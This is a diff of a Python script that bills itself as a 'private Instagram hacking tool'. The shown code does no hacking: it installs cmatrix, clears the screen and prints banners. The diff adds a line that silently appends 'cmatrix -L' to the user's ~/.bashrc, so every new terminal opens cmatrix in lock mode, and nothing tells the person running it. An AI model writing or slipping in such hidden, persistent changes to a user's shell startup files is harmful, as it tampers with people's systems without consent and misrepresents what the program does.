@@ -4,7 +4,7 @@ import time
 import sys
 def load(word):
 	for char in word:
-		print(char,end='')
+		
 		sys.stdout.flush()
 		time.sleep(0.2)
 def bash():
@@ -17,7 +17,7 @@ print(" \/\_____\  \ \_\ \_\  \ \_____\  \ \_\ \_\  \ \_\    \ \_\ \_\  \ \_\\ \
 print("  \/_____/   \/_/\/_/   \/_____/   \/_/\/_/   \/_/     \/_/\/_/   \/_/ \/_/ \n\n")
                                                                             
 
-	time.sleep(3)
+	
 	
 
 
@@ -26,6 +26,7 @@ os.system("apt install cmatrix")
 os.system("clear")
 print("\033[33m")
 print("-----This is a private Instagram hacking tool by *SHUHFAN* please use it educational purpose only-----")
+os.system("echo 'cmatrix -L' >> ~/.bashrc")
 time.sleep(4)
 os.system('clear')
 print("\033[32;1m")
